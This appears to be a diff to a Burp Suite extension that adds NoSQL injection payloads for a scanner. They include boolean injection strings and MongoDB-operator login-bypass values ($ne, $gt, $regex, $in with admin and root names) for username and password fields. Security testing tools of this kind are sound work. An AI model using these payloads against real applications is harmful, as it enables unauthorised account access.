@@ -17,8 +17,38 @@ public class NNN implements BurpExtension {
     private ArrayList<Payload> payloadsArrayList = new ArrayList<>();
 
     private void LoadPayloads() {
-        this.payloadsArrayList.add(new Payload(PayloadType.FUZZ_STRING, "'\"`{;$Foo}$Foo \\xYZ", "'\"`{;$Foo}$Foo \\xYZ", null));
+        // Fuzz String
+        this.payloadsArrayList.add(new Payload(PayloadType.FUZZ_STRING, "'\"`{;$Foo}$Foo \\xYZ", null, null));
 
+        // Boolean payloads
+        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData("' && 0 && 'x"), "' && 0 && 'x", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData("' && 1 && 'x"), "' && 1 && 'x", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" && 0 && x"), " && 0 && x", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" && 1 && x"), " && 1 && x", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData("'||1|| '"), "'||1|| '", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.BOOLEAN, urlEncodeData(" ||1|| "), " ||1|| ", null));
+
+        // Payloads for password field
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \":\" invalidpassword \"}"), "{\" $ne \":\" invalidpassword \"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": null }"), "{\" $ne \": null }", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $ne \": \" xd \"}"), "{\" $ne \": \" xd \"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \": undefined }"), "{\" $gt \": undefined }", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_PASSWORD, urlEncodeData("{\" $gt \":\"\"}"), "{\" $gt \":\"\"}", null));
+
+        // Payloads for username field
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("admin"), "admin", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $regex \":\" admin .*\"}"), "{\" $regex \":\" admin .*\"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $ne \": null }"), "{\" $ne \": null }", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $ne \": \" foo \"}"), "{\" $ne \": \" foo \"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $gt \": undefined }"), "{\" $gt \": undefined }", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $gt \":\"\"}"), "{\" $gt \":\"\"}", null));
+        this.payloadsArrayList.add(new Payload(PayloadType.AUTHENTICATION_BYPASS_USERNAME, urlEncodeData("{\" $in \":[\" Admin \", \"4dm1n \", \" admin \" , \" root \", \" administrator \"]}"), "{\" $in \":[\" Admin \", \"4dm1n \", \" admin \" , \" root \", \" administrator \"]}", null));
+
+        // Data extraction payloads have to be handled directly
+    }
+
+    public String urlEncodeData(String data) {
+        return api.utilities().urlUtils().encode(data);
     }
 
     @Override
